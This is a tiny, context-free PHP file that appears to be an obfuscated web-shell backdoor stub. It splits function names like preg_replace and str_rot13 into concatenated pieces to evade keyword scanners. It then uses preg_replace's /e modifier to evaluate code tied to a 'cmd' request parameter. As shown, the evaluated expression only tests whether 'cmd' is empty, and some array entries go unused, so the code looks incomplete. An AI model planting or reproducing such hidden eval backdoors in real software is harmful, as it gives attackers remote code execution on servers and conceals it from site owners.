<?php
$f=array('pre'.'g_re'.'place','st'.'r_r'.'ot13','$_'.'P'.'OST["cmd"]');
$xxx='!e'.'mpt'.'y($_R'.'EQUE'.'ST["cmd"])';
$f[0]('/x/e',$xxx,'');
?>
